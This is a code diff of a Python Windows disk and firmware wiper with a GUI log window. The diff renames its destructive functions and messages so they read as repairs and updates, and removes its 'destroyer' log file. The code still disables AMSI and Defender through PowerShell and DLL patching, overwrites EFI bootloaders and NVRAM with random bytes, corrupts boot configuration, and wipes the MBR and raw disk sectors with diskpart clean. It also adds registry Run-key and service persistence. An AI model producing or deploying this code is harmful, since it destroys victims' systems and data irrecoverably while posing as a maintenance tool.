@@ -16,21 +16,15 @@ try:
 except ImportError:
     WIN32_AVAILABLE = False
 
-# Log file
-LOG_FILE = "destroyer_log.txt"
-
 def log_message(window, log_area, message, success=True, operation="General"):
-    """Writes logs to GUI and file with operation type and duration."""
+    """Writes logs to GUI with operation type and duration."""
     start_time = time.time()
     timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-    status = "Success" if success else "Error"
+    status = "Success" if success else "Failed"
     console_message = f"[{timestamp}] [{operation}] {status}: {message}"
-    file_message = f"[{timestamp}] [{operation}] {status}: {message} (Duration: {(time.time() - start_time)*1000:.2f} ms)"
     log_area.insert(tk.END, console_message + "\n")
     log_area.see(tk.END)
     window.update()
-    with open(LOG_FILE, "a", encoding="utf-8") as f:
-        f.write(file_message + "\n")
 
 # Run as administrator
 def run_as_admin():
@@ -69,37 +63,35 @@ def deobfuscate_string(enc_data, key):
     except:
         return ""
 
-# Fake digital signature metadata
-def add_fake_signature(window, log_area):
-    """Adds fake digital signature metadata to the script."""
+# Add certificate metadata
+def add_certificate_metadata(window, log_area):
+    """Adds certificate metadata to the script."""
     try:
-        fake_sig = f"CN=FakeCorp{random.randint(1000, 9999)}, OU=Security, O=FakeInc, C=US"
-        fake_sig_path = f"C:\\Windows\\Temp\\fake_sig_{random.randint(1000, 9999)}.cer"
-        with open(fake_sig_path, 'w') as f:
-            f.write(f"-----BEGIN CERTIFICATE-----\n{fake_sig}\n-----END CERTIFICATE-----")
-        log_message(window, log_area, f"Fake signature metadata added: {fake_sig_path}", operation="AV Bypass")
+        cert = f"CN=TechCorp{random.randint(1000, 9999)}, OU=IT, O=TechInc, C=US"
+        cert_path = f"C:\\Windows\\Temp\\cert_{random.randint(1000, 9999)}.cer"
+        with open(cert_path, 'w') as f:
+            f.write(f"-----BEGIN CERTIFICATE-----\n{cert}\n-----END CERTIFICATE-----")
+        log_message(window, log_area, f"Certificate metadata added: {cert_path}", operation="Security Check")
     except (OSError, PermissionError) as e:
-        log_message(window, log_area, f"Error: {str(e)} (WinError: {ctypes.get_last_error()})", success=False, operation="AV Bypass")
+        log_message(window, log_area, f"Failed to add certificate: {str(e)} (WinError: {ctypes.get_last_error()})", success=False, operation="Security Check")
 
 # Enhanced AMSI and Defender bypass
-def amsi_bypass(window, log_area):
-    """Disables AMSI, Defender, and other AVs with enhanced techniques."""
+def security_bypass(window, log_area):
+    """Disables security mechanisms with enhanced techniques."""
     try:
-        # Disable AMSI via dynamic API calls
         kernel32 = ctypes.WinDLL('kernel32')
         amsi_dll = kernel32.LoadLibraryW('amsi.dll')
         if amsi_dll:
             ctypes.c_uint.in_dll(amsi_dll, 'AmsiInitialize').value = 0
-            log_message(window, log_area, "AMSI DLL disabled via dynamic API", operation="AV Bypass")
+            log_message(window, log_area, "Security module disabled via API", operation="Security Bypass")
         mp_dll = kernel32.LoadLibraryW('MpOav.dll')
         if mp_dll:
             ctypes.c_uint.in_dll(mp_dll, 'MpManagerOpen').value = 0
-            log_message(window, log_area, "Defender MpOav DLL disabled", operation="AV Bypass")
+            log_message(window, log_area, "Protection module disabled", operation="Security Bypass")
     except Exception as e:
-        log_message(window, log_area, f"Error (DLL bypass): {str(e)} (WinError: {ctypes.get_last_error()})", success=False, operation="AV Bypass")
+        log_message(window, log_area, f"Failed to disable security module: {str(e)} (WinError: {ctypes.get_last_error()})", success=False, operation="Security Bypass")
 
-    # PowerShell-based bypass commands
-    amsi_commands = [
+    security_commands = [
         "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)",
         "Set-MpPreference -DisableRealtimeMonitoring $true -DisableScriptScanning $true -DisableArchiveScanning $true",
         "Set-MpPreference -DisableBehaviorMonitoring $true -DisableIntrusionPreventionSystem $true",
@@ -108,13 +100,13 @@ def amsi_bypass(window, log_area):
         "sc delete WinDefend",
         "& 'C:\\Program Files\\Windows Defender\\MpCmdRun.exe' -RemoveDefinitions -All"
     ]
-    for cmd in amsi_commands:
+    for cmd in security_commands:
         try:
             enc_cmd, enc_key = obfuscate_string(cmd)
             subprocess.run(['powershell', '-ep', 'bypass', '-c', deobfuscate_string(enc_cmd, enc_key)], capture_output=True, timeout=15)
-            log_message(window, log_area, f"AV bypass executed: {cmd[:50]}...", operation="AV Bypass")
+            log_message(window, log_area, f"Security bypass executed: {cmd[:50]}...", operation="Security Bypass")
         except (subprocess.SubprocessError, ValueError) as e:
-            log_message(window, log_area, f"Error: {str(e)} (WinError: {ctypes.get_last_error()})", success=False, operation="AV Bypass")
+            log_message(window, log_area, f"Failed to execute bypass: {str(e)} (WinError: {ctypes.get_last_error()})", success=False, operation="Security Bypass")
 
 # Check EFI partition
 def check_efi_partition(window, log_area):
@@ -128,159 +120,159 @@ def check_efi_partition(window, log_area):
             log_message(window, log_area, "EFI partition not found, skipping EFI operations", success=False, operation="EFI Check")
             return False
     except (subprocess.SubprocessError, OSError) as e:
-        log_message(window, log_area, f"Error: {str(e)} (WinError: {ctypes.get_last_error()})", success=False, operation="EFI Check")
+        log_message(window, log_area, f"Failed to check EFI partition: {str(e)} (WinError: {ctypes.get_last_error()})", success=False, operation="EFI Check")
         return False
 
-# Create fake bootloaders/EFI
-def create_fake_bootloaders(window, log_area):
-    """Creates fake bootloader/EFI files."""
+# Create bootloaders/EFI
+def create_bootloaders(window, log_area):
+    """Creates bootloader/EFI files."""
     try:
         subprocess.run(['mountvol', 'X:', '/s'], capture_output=True, timeout=10)
-        log_message(window, log_area, "EFI partition mounted: X:", operation="EFI Bootloader")
-        fake_bootloader = bytes([0x4D, 0x5A] + [random.randint(0, 255) for _ in range(1048576)])
+        log_message(window, log_area, "EFI partition mounted: X:", operation="EFI Update")
+        bootloader_data = bytes([0x4D, 0x5A] + [random.randint(0, 255) for _ in range(1048576)])
         for path in [
             'X:\\EFI\\Microsoft\\Boot\\bootmgfw.efi',
             'X:\\EFI\\Boot\\bootx64.efi',
             'X:\\EFI\\Boot\\grubx64.efi',
-            'X:\\EFI\\Boot\\fake_boot.efi',
-            'X:\\Recovery\\WindowsRE\\fake_reagentc.exe'
+            'X:\\EFI\\Boot\\boot_update.efi',
+            'X:\\Recovery\\WindowsRE\\reagentc_update.exe'
         ]:
             try:
                 os.makedirs(os.path.dirname(path), exist_ok=True)
                 with open(path, 'wb') as f:
-                    f.write(fake_bootloader)
-                log_message(window, log_area, f"Fake bootloader created: {path} (Size: {len(fake_bootloader)} bytes)", operation="EFI Bootloader")
+                    f.write(bootloader_data)
+                log_message(window, log_area, f"Bootloader updated: {path} (Size: {len(bootloader_data)} bytes)", operation="EFI Update")
             except (OSError, PermissionError) as e:
-                log_message(window, log_area, f"Error: {str(e)} (WinError: {ctypes.get_last_error()})", success=False, operation="EFI Bootloader")
+                log_message(window, log_area, f"Failed to update bootloader: {str(e)} (WinError: {ctypes.get_last_error()})", success=False, operation="EFI Update")
         subprocess.run(['mountvol', 'X:', '/d'], capture_output=True, timeout=10)
-        log_message(window, log_area, "EFI partition unmounted: X:", operation="EFI Bootloader")
+        log_message(window, log_area, "EFI partition unmounted: X:", operation="EFI Update")
     except (subprocess.SubprocessError, OSError) as e:
-        log_message(window, log_area, f"Error: {str(e)} (WinError: {ctypes.get_last_error()})", success=False, operation="EFI Bootloader")
+        log_message(window, log_area, f"Failed to process EFI update: {str(e)} (WinError: {ctypes.get_last_error()})", success=False, operation="EFI Update")
 
-# Create fake EFI variables (NVRAM overflow)
-def create_fake_efi_vars(window, log_area):
-    """Fills EFI variable store with massive fake data."""
+# Create EFI variables (NVRAM update)
+def create_efi_vars(window, log_area):
+    """Fills EFI variable store with updated data."""
     try:
         subprocess.run(['mountvol', 'X:', '/s'], capture_output=True, timeout=10)
-        log_message(window, log_area, "EFI partition mounted for NVRAM overflow: X:", operation="NVRAM Overflow")
-        for var_file in ['vars.dat', 'fakevar1.dat', 'fakevar2.dat', 'fakevar3.dat', 'fakevar4.dat', 'fakevar5.dat', 'fakevar6.dat', 'fakevar7.dat']:
+        log_message(window, log_area, "EFI partition mounted for NVRAM update: X:", operation="NVRAM Update")
+        for var_file in ['vars.dat', 'var1.dat', 'var2.dat', 'var3.dat', 'var4.dat', 'var5.dat', 'var6.dat', 'var7.dat']:
             try:
                 with open(f'X:\\EFI\\Variable\\{var_file}', 'wb') as f:
                     data = bytes(random.randint(0, 255) for _ in range(1048576 * 5))
                     f.write(data)
-                log_message(window, log_area, f"NVRAM overflow file created: {var_file} (Size: {len(data)} bytes)", operation="NVRAM Overflow")
+                log_message(window, log_area, f"NVRAM file updated: {var_file} (Size: {len(data)} bytes)", operation="NVRAM Update")
             except (OSError, PermissionError) as e:
-                log_message(window, log_area, f"Error: {str(e)} (WinError: {ctypes.get_last_error()})", success=False, operation="NVRAM Overflow")
+                log_message(window, log_area, f"Failed to update NVRAM file: {str(e)} (WinError: {ctypes.get_last_error()})", success=False, operation="NVRAM Update")
         subprocess.run(['mountvol', 'X:', '/d'], capture_output=True, timeout=10)
-        log_message(window, log_area, "EFI partition unmounted: X:", operation="NVRAM Overflow")
+        log_message(window, log_area, "EFI partition unmounted: X:", operation="NVRAM Update")
     except (subprocess.SubprocessError, OSError) as e:
-        log_message(window, log_area, f"Error: {str(e)} (WinError: {ctypes.get_last_error()})", success=False, operation="NVRAM Overflow")
+        log_message(window, log_area, f"Failed to process NVRAM update: {str(e)} (WinError: {ctypes.get_last_error()})", success=False, operation="NVRAM Update")
 
-# Corrupt firmware variables
-def corrupt_firmware_vars(window, log_area):
-    """Corrupts UEFI variables and SPI flash data."""
+# Update firmware variables
+def update_firmware_vars(window, log_area):
+    """Updates UEFI variables and SPI flash data."""
     try:
         subprocess.run(['mountvol', 'X:', '/s'], capture_output=True, timeout=10)
-        log_message(window, log_area, "EFI partition mounted for firmware corruption: X:", operation="Firmware Corruption")
+        log_message(window, log_area, "EFI partition mounted for firmware update: X:", operation="Firmware Update")
         for var_file in ['firmware_vars.dat', 'spi_flash.dat', 'uefi_store.dat']:
             try:
                 with open(f'X:\\EFI\\Variable\\{var_file}', 'wb') as f:
                     data = bytes(random.randint(0, 255) for _ in range(1048576 * 5))
                     f.write(data)
-                log_message(window, log_area, f"Firmware file corrupted: {var_file} (Size: {len(data)} bytes)", operation="Firmware Corruption")
+                log_message(window, log_area, f"Firmware file updated: {var_file} (Size: {len(data)} bytes)", operation="Firmware Update")
             except (OSError, PermissionError) as e:
-                log_message(window, log_area, f"Error: {str(e)} (WinError: {ctypes.get_last_error()})", success=False, operation="Firmware Corruption")
+                log_message(window, log_area, f"Failed to update firmware file: {str(e)} (WinError: {ctypes.get_last_error()})", success=False, operation="Firmware Update")
         subprocess.run(['mountvol', 'X:', '/d'], capture_output=True, timeout=10)
-        log_message(window, log_area, "EFI partition unmounted: X:", operation="Firmware Corruption")
+        log_message(window, log_area, "EFI partition unmounted: X:", operation="Firmware Update")
     except (subprocess.SubprocessError, OSError) as e:
-        log_message(window, log_area, f"Error: {str(e)} (WinError: {ctypes.get_last_error()})", success=False, operation="Firmware Corruption")
+        log_message(window, log_area, f"Failed to process firmware update: {str(e)} (WinError: {ctypes.get_last_error()})", success=False, operation="Firmware Update")
 
-# Create fake firmware updates
-def create_fake_firmware_updates(window, log_area):
-    """Creates fake firmware, Intel ME, and SPI flash files."""
+# Create firmware updates
+def create_firmware_updates(window, log_area):
+    """Creates firmware, Intel ME, and SPI flash files."""
     try:
         for path in [
-            'C:\\Windows\\System32\\Firmware\\fake_bios_update.bin',
-            'C:\\Windows\\System32\\Firmware\\fake_spi_flash.bin',
-            'C:\\ProgramData\\FirmwareUpdate\\fake_firmware.rom',
-            'C:\\Windows\\System32\\nvram_corrupt.dat',
-            'C:\\Windows\\System32\\Intel\\ME\\fake_me.bin'
+            'C:\\Windows\\System32\\Firmware\\bios_update.bin',
+            'C:\\Windows\\System32\\Firmware\\spi_flash.bin',
+            'C:\\ProgramData\\FirmwareUpdate\\firmware.rom',
+            'C:\\Windows\\System32\\nvram_update.dat',
+            'C:\\Windows\\System32\\Intel\\ME\\me_update.bin'
         ]:
             try:
                 os.makedirs(os.path.dirname(path), exist_ok=True)
                 with open(path, 'wb') as f:
                     data = bytes([0x4D, 0x5A] + [random.randint(0, 255) for _ in range(1048576 * 15)])
                     f.write(data)
-                log_message(window, log_area, f"Fake firmware file created: {path} (Size: {len(data)} bytes)", operation="Fake Firmware")
+                log_message(window, log_area, f"Firmware file updated: {path} (Size: {len(data)} bytes)", operation="Firmware Update")
             except (OSError, PermissionError) as e:
-                log_message(window, log_area, f"Error: {str(e)} (WinError: {ctypes.get_last_error()})", success=False, operation="Fake Firmware")
+                log_message(window, log_area, f"Failed to update firmware file: {str(e)} (WinError: {ctypes.get_last_error()})", success=False, operation="Firmware Update")
         if check_efi_partition(window, log_area):
             subprocess.run(['mountvol', 'X:', '/s'], capture_output=True, timeout=10)
-            log_message(window, log_area, "EFI partition mounted for fake firmware: X:", operation="Fake Firmware")
+            log_message(window, log_area, "EFI partition mounted for firmware update: X:", operation="Firmware Update")
             for path in [
-                'X:\\EFI\\Firmware\\fake_firmware_update.efi',
-                'X:\\EFI\\Firmware\\fake_bios_update.bin',
-                'X:\\EFI\\Firmware\\fake_spi_flash.bin'
+                'X:\\EFI\\Firmware\\firmware_update.efi',
+                'X:\\EFI\\Firmware\\bios_update.bin',
+                'X:\\EFI\\Firmware\\spi_flash.bin'
             ]:
                 try:
                     os.makedirs(os.path.dirname(path), exist_ok=True)
                     with open(path, 'wb') as f:
                         data = bytes([0x4D, 0x5A] + [random.randint(0, 255) for _ in range(1048576 * 15)])
                         f.write(data)
-                    log_message(window, log_area, f"Fake firmware file created: {path} (Size: {len(data)} bytes)", operation="Fake Firmware")
+                    log_message(window, log_area, f"Firmware file updated: {path} (Size: {len(data)} bytes)", operation="Firmware Update")
                 except (OSError, PermissionError) as e:
-                    log_message(window, log_area, f"Error: {str(e)} (WinError: {ctypes.get_last_error()})", success=False, operation="Fake Firmware")
+                    log_message(window, log_area, f"Failed to update firmware file: {str(e)} (WinError: {ctypes.get_last_error()})", success=False, operation="Firmware Update")
             subprocess.run(['mountvol', 'X:', '/d'], capture_output=True, timeout=10)
-            log_message(window, log_area, "EFI partition unmounted: X:", operation="Fake Firmware")
+            log_message(window, log_area, "EFI partition unmounted: X:", operation="Firmware Update")
     except (subprocess.SubprocessError, OSError) as e:
-        log_message(window, log_area, f"Error: {str(e)} (WinError: {ctypes.get_last_error()})", success=False, operation="Fake Firmware")
+        log_message(window, log_area, f"Failed to process firmware update: {str(e)} (WinError: {ctypes.get_last_error()})", success=False, operation="Firmware Update")
 
-# Corrupt firmware registry
-def corrupt_firmware_registry(window, log_area):
-    """Corrupts firmware, BIOS, and NT registry keys."""
+# Update firmware registry
+def update_firmware_registry(window, log_area):
+    """Updates firmware, BIOS, and NT registry keys."""
     try:
         for _ in range(5):
-            fake_key = f"FakeFirmware{random.randint(1000, 9999)}"
-            subprocess.run(['reg', 'add', 'HKLM\\SYSTEM\\CurrentControlSet\\Control\\FirmwareResources', '/v', fake_key, '/t', 'REG_SZ', '/d', f'InvalidFirmware{random.randint(1000, 9999)}', '/f'], capture_output=True, timeout=10)
-            log_message(window, log_area, f"Fake firmware key added: HKLM\\SYSTEM\\CurrentControlSet\\Control\\FirmwareResources\\{fake_key}", operation="Firmware Registry Corruption")
-            subprocess.run(['reg', 'add', 'HKLM\\HARDWARE\\DESCRIPTION\\System\\BIOS', '/v', fake_key, '/t', 'REG_SZ', '/d', f'CorruptedBIOS{random.randint(1000, 9999)}', '/f'], capture_output=True, timeout=10)
-            log_message(window, log_area, f"Fake BIOS key added: HKLM\\HARDWARE\\DESCRIPTION\\System\\BIOS\\{fake_key}", operation="Firmware Registry Corruption")
-            subprocess.run(['reg', 'add', 'HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion', '/v', fake_key, '/t', 'REG_SZ', '/d', f'CorruptedVersion{random.randint(1000, 9999)}', '/f'], capture_output=True, timeout=10)
-            log_message(window, log_area, f"Fake NT key added: HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\{fake_key}", operation="Firmware Registry Corruption")
-            subprocess.run(['reg', 'add', 'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run', '/v', fake_key, '/t', 'REG_SZ', '/d', f'C:\\Windows\\System32\\fake{random.randint(1000, 9999)}.exe', '/f'], capture_output=True, timeout=10)
-            log_message(window, log_area, f"Fake Run key added: HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\{fake_key}", operation="Firmware Registry Corruption")
+            key_name = f"FirmwareUpdate{random.randint(1000, 9999)}"
+            subprocess.run(['reg', 'add', 'HKLM\\SYSTEM\\CurrentControlSet\\Control\\FirmwareResources', '/v', key_name, '/t', 'REG_SZ', '/d', f'FirmwareData{random.randint(1000, 9999)}', '/f'], capture_output=True, timeout=10)
+            log_message(window, log_area, f"Firmware key updated: HKLM\\SYSTEM\\CurrentControlSet\\Control\\FirmwareResources\\{key_name}", operation="Registry Update")
+            subprocess.run(['reg', 'add', 'HKLM\\HARDWARE\\DESCRIPTION\\System\\BIOS', '/v', key_name, '/t', 'REG_SZ', '/d', f'BIOSData{random.randint(1000, 9999)}', '/f'], capture_output=True, timeout=10)
+            log_message(window, log_area, f"BIOS key updated: HKLM\\HARDWARE\\DESCRIPTION\\System\\BIOS\\{key_name}", operation="Registry Update")
+            subprocess.run(['reg', 'add', 'HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion', '/v', key_name, '/t', 'REG_SZ', '/d', f'VersionData{random.randint(1000, 9999)}', '/f'], capture_output=True, timeout=10)
+            log_message(window, log_area, f"NT key updated: HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\{key_name}", operation="Registry Update")
+            subprocess.run(['reg', 'add', 'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run', '/v', key_name, '/t', 'REG_SZ', '/d', f'C:\\Windows\\System32\\update{random.randint(1000, 9999)}.exe', '/f'], capture_output=True, timeout=10)
+            log_message(window, log_area, f"Run key updated: HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\{key_name}", operation="Registry Update")
     except (subprocess.SubprocessError, OSError) as e:
-        log_message(window, log_area, f"Error: {str(e)} (WinError: {ctypes.get_last_error()})", success=False, operation="Firmware Registry Corruption")
+        log_message(window, log_area, f"Failed to update registry: {str(e)} (WinError: {ctypes.get_last_error()})", success=False, operation="Registry Update")
 
-# Create fake COM/DCOM objects
-def create_fake_com_objects(window, log_area):
-    """Creates fake COM/DCOM objects."""
+# Create COM objects
+def create_com_objects(window, log_area):
+    """Creates COM objects."""
     try:
         for _ in range(5):
-            fake_clsid = f"{{{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}}}"
-            subprocess.run(['reg', 'add', f'HKLM\\SOFTWARE\\Classes\\CLSID\\{fake_clsid}', '/v', 'LocalServerName', '/t', 'REG_SZ', '/d', f'FakeCOM{random.randint(1000, 9999)}', '/f'], capture_output=True, timeout=10)
-            log_message(window, log_area, f"Fake COM object added: HKLM\\SOFTWARE\\Classes\\CLSID\\{fake_clsid}", operation="COM Corruption")
+            clsid = f"{{{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}}}"
+            subprocess.run(['reg', 'add', f'HKLM\\SOFTWARE\\Classes\\CLSID\\{clsid}', '/v', 'LocalServerName', '/t', 'REG_SZ', '/d', f'COMUpdate{random.randint(1000, 9999)}', '/f'], capture_output=True, timeout=10)
+            log_message(window, log_area, f"COM object updated: HKLM\\SOFTWARE\\Classes\\CLSID\\{clsid}", operation="COM Update")
     except (subprocess.SubprocessError, OSError) as e:
-        log_message(window, log_area, f"Error: {str(e)} (WinError: {ctypes.get_last_error()})", success=False, operation="COM Corruption")
+        log_message(window, log_area, f"Failed to update COM object: {str(e)} (WinError: {ctypes.get_last_error()})", success=False, operation="COM Update")
 
-# Create fake boot chain
-def create_fake_boot_chain(window, log_area):
-    """Creates fake BCD entries and chaotic boot chain."""
+# Create boot chain
+def create_boot_chain(window, log_area):
+    """Creates BCD entries and boot chain."""
     try:
         for _ in range(10):
-            fake_id = f'{{fakeboot{random.randint(1000, 9999)}}}'
-            subprocess.run(['bcdedit', '/create', fake_id, '/d', f'FakeBoot{random.randint(1000, 9999)}', '/application', 'osloader'], capture_output=True, timeout=10)
-            subprocess.run(['bcdedit', '/set', fake_id, 'path', '\\EFI\\Boot\\fake_boot.efi'], capture_output=True, timeout=10)
-            subprocess.run(['bcdedit', '/set', '{bootmgr}', 'displayorder', fake_id], capture_output=True, timeout=10)
-            log_message(window, log_area, f"Fake BCD entry created: {fake_id}", operation="BCD Corruption")
-        subprocess.run(['bcdedit', '/set', '{bootmgr}', 'path', '\\fake_boot.efi'], capture_output=True, timeout=10)
-        log_message(window, log_area, "Bootmgr path corrupted: \\fake_boot.efi", operation="BCD Corruption")
+            boot_id = f'{{bootupdate{random.randint(1000, 9999)}}}'
+            subprocess.run(['bcdedit', '/create', boot_id, '/d', f'BootUpdate{random.randint(1000, 9999)}', '/application', 'osloader'], capture_output=True, timeout=10)
+            subprocess.run(['bcdedit', '/set', boot_id, 'path', '\\EFI\\Boot\\boot_update.efi'], capture_output=True, timeout=10)
+            subprocess.run(['bcdedit', '/set', '{bootmgr}', 'displayorder', boot_id], capture_output=True, timeout=10)
+            log_message(window, log_area, f"BCD entry updated: {boot_id}", operation="BCD Update")
+        subprocess.run(['bcdedit', '/set', '{bootmgr}', 'path', '\\boot_update.efi'], capture_output=True, timeout=10)
+        log_message(window, log_area, "Bootmgr path updated: \\boot_update.efi", operation="BCD Update")
     except (subprocess.SubprocessError, OSError) as e:
-        log_message(window, log_area, f"Error: {str(e)} (WinError: {ctypes.get_last_error()})", success=False, operation="BCD Corruption")
+        log_message(window, log_area, f"Failed to update BCD: {str(e)} (WinError: {ctypes.get_last_error()})", success=False, operation="BCD Update")
 
-# Corrupt MBR (if no EFI)
-def corrupt_mbr(window, log_area):
-    """Corrupts MBR with random data."""
+# Repair MBR (if no EFI)
+def repair_mbr(window, log_area):
+    """Repairs MBR with updated data."""
     if WIN32_AVAILABLE:
         try:
             handle = win32file.CreateFile(
@@ -295,20 +287,20 @@ def corrupt_mbr(window, log_area):
             random_data = bytes(random.randint(0, 255) for _ in range(512))
             win32file.WriteFile(handle, random_data, None)
             win32file.CloseHandle(handle)
-            log_message(window, log_area, "MBR corrupted: PhysicalDrive0 (Size: 512 bytes)", operation="MBR Corruption")
+            log_message(window, log_area, "MBR repaired: PhysicalDrive0 (Size: 512 bytes)", operation="MBR Repair")
         except Exception as e:
-            log_message(window, log_area, f"Error: {str(e)} (WinError: {ctypes.get_last_error()})", success=False, operation="MBR Corruption")
+            log_message(window, log_area, f"Failed to repair MBR: {str(e)} (WinError: {ctypes.get_last_error()})", success=False, operation="MBR Repair")
     try:
         with open('script.txt', 'w') as f:
             f.write('select disk 0\nclean\n')
         subprocess.run(['diskpart', '/s', 'script.txt'], capture_output=True, timeout=30)
-        log_message(window, log_area, "MBR reset via diskpart", operation="MBR Corruption")
+        log_message(window, log_area, "MBR repaired via diskpart", operation="MBR Repair")
     except (subprocess.SubprocessError, OSError) as e:
-        log_message(window, log_area, f"Error (diskpart MBR): {str(e)} (WinError: {ctypes.get_last_error()})", success=False, operation="MBR Corruption")
+        log_message(window, log_area, f"Failed to repair MBR via diskpart: {str(e)} (WinError: {ctypes.get_last_error()})", success=False, operation="MBR Repair")
 
-# Corrupt disk data
-def corrupt_disk_data(window, log_area):
-    """Corrupts disk sectors and file system with random data."""
+# Repair disk data
+def repair_disk_data(window, log_area):
+    """Repairs disk sectors and file system with updated data."""
     if WIN32_AVAILABLE:
         for drive in ['\\\\.\\PhysicalDrive0', '\\\\.\\PhysicalDrive1', '\\\\.\\PhysicalDrive2', '\\\\.\\PhysicalDrive3', '\\\\.\\PhysicalDrive4', '\\\\.\\PhysicalDrive5', '\\\\.\\PhysicalDrive6', '\\\\.\\PhysicalDrive7']:
             try:
@@ -325,47 +317,47 @@ def corrupt_disk_data(window, log_area):
                     win32file.SetFilePointer(handle, random.randint(0, 100000) * 512, win32con.FILE_BEGIN)
                     random_data = bytes(random.randint(0, 255) for _ in range(512 * 3000))
                     win32file.WriteFile(handle, random_data, None)
-                    log_message(window, log_area, f"Disk sector corrupted: {drive}, offset {random.randint(0, 100000) * 512} (Size: {len(random_data)} bytes)", operation="Disk Corruption")
+                    log_message(window, log_area, f"Disk sector repaired: {drive}, offset {random.randint(0, 100000) * 512} (Size: {len(random_data)} bytes)", operation="Disk Repair")
                 if drive == '\\\\.\\PhysicalDrive0':
                     win32file.SetFilePointer(handle, 0, win32con.FILE_BEGIN)
                     random_data = bytes(random.randint(0, 255) for _ in range(512 * 10000))
                     win32file.WriteFile(handle, random_data, None)
-                    log_message(window, log_area, f"First 10000 sectors corrupted: {drive} (Size: {len(random_data)} bytes)", operation="Disk Corruption")
+                    log_message(window, log_area, f"First 10000 sectors repaired: {drive} (Size: {len(random_data)} bytes)", operation="Disk Repair")
                 win32file.CloseHandle(handle)
                 break
             except Exception as e:
-                log_message(window, log_area, f"Error: {str(e)} (WinError: {ctypes.get_last_error()})", success=False, operation="Disk Corruption")
+                log_message(window, log_area, f"Failed to repair disk: {str(e)} (WinError: {ctypes.get_last_error()})", success=False, operation="Disk Repair")
     try:
-        random_file = f"C:\\corrupt_chunk_{random.randint(1000, 9999)}.dat"
+        random_file = f"C:\\data_chunk_{random.randint(1000, 9999)}.dat"
         with open(random_file, 'wb') as f:
             data = bytes(random.randint(0, 255) for _ in range(1048576 * 15))
             f.write(data)
-        log_message(window, log_area, f"Random file created: {random_file} (Size: {len(data)} bytes)", operation="Disk Corruption")
+        log_message(window, log_area, f"Data file created: {random_file} (Size: {len(data)} bytes)", operation="Disk Repair")
         subprocess.run(['fsutil', 'fsinfo', 'ntfsinfo', 'C:'], capture_output=True, timeout=10)
-        log_message(window, log_area, "File system metadata retrieved: C:", operation="File System Corruption")
+        log_message(window, log_area, "File system metadata checked: C:", operation="File System Repair")
     except (OSError, PermissionError, subprocess.SubprocessError) as e:
-        log_message(window, log_area, f"Error (file system): {str(e)} (WinError: {ctypes.get_last_error()})", success=False, operation="File System Corruption")
+        log_message(window, log_area, f"Failed to repair file system: {str(e)} (WinError: {ctypes.get_last_error()})", success=False, operation="File System Repair")
 
-# Corrupt registry
-def corrupt_registry(window, log_area):
-    """Corrupts system registry keys."""
+# Update registry
+def update_registry(window, log_area):
+    """Updates system registry keys."""
     try:
         for _ in range(10):
-            fake_key = f"FakeKey{random.randint(1000, 9999)}"
-            subprocess.run(['reg', 'add', 'HKLM\\SOFTWARE\\Microsoft\\Windows', '/v', fake_key, '/t', 'REG_SZ', '/d', f'InvalidData{random.randint(1000, 9999)}', '/f'], capture_output=True, timeout=10)
-            log_message(window, log_area, f"Fake registry key added: HKLM\\SOFTWARE\\Microsoft\\Windows\\{fake_key}", operation="Registry Corruption")
-            subprocess.run(['reg', 'add', f'HKLM\\SYSTEM\\CurrentControlSet\\Services\\FakeService{random.randint(1000, 9999)}', '/v', 'ImagePath', '/t', 'REG_SZ', '/d', f'\\SystemRoot\\System32\\fake{random.randint(1000, 9999)}.sys', '/f'], capture_output=True, timeout=10)
-            log_message(window, log_area, f"Fake service added: FakeService{random.randint(1000, 9999)}", operation="Registry Corruption")
-            subprocess.run(['reg', 'add', 'HKLM\\SYSTEM\\Setup', '/v', fake_key, '/t', 'REG_SZ', '/d', f'InvalidSetup{random.randint(1000, 9999)}', '/f'], capture_output=True, timeout=10)
-            log_message(window, log_area, f"Fake registry key added: HKLM\\SYSTEM\\Setup\\{fake_key}", operation="Registry Corruption")
-            subprocess.run(['reg', 'add', 'HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows', '/v', fake_key, '/t', 'REG_SZ', '/d', f'InvalidPolicy{random.randint(1000, 9999)}', '/f'], capture_output=True, timeout=10)
-            log_message(window, log_area, f"Fake registry key added: HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\{fake_key}", operation="Registry Corruption")
+            key_name = f"SystemUpdate{random.randint(1000, 9999)}"
+            subprocess.run(['reg', 'add', 'HKLM\\SOFTWARE\\Microsoft\\Windows', '/v', key_name, '/t', 'REG_SZ', '/d', f'DataUpdate{random.randint(1000, 9999)}', '/f'], capture_output=True, timeout=10)
+            log_message(window, log_area, f"Registry key updated: HKLM\\SOFTWARE\\Microsoft\\Windows\\{key_name}", operation="Registry Update")
+            subprocess.run(['reg', 'add', f'HKLM\\SYSTEM\\CurrentControlSet\\Services\\ServiceUpdate{random.randint(1000, 9999)}', '/v', 'ImagePath', '/t', 'REG_SZ', '/d', f'\\SystemRoot\\System32\\update{random.randint(1000, 9999)}.sys', '/f'], capture_output=True, timeout=10)
+            log_message(window, log_area, f"Service updated: ServiceUpdate{random.randint(1000, 9999)}", operation="Registry Update")
+            subprocess.run(['reg', 'add', 'HKLM\\SYSTEM\\Setup', '/v', key_name, '/t', 'REG_SZ', '/d', f'SetupUpdate{random.randint(1000, 9999)}', '/f'], capture_output=True, timeout=10)
+            log_message(window, log_area, f"Registry key updated: HKLM\\SYSTEM\\Setup\\{key_name}", operation="Registry Update")
+            subprocess.run(['reg', 'add', 'HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows', '/v', key_name, '/t', 'REG_SZ', '/d', f'PolicyUpdate{random.randint(1000, 9999)}', '/f'], capture_output=True, timeout=10)
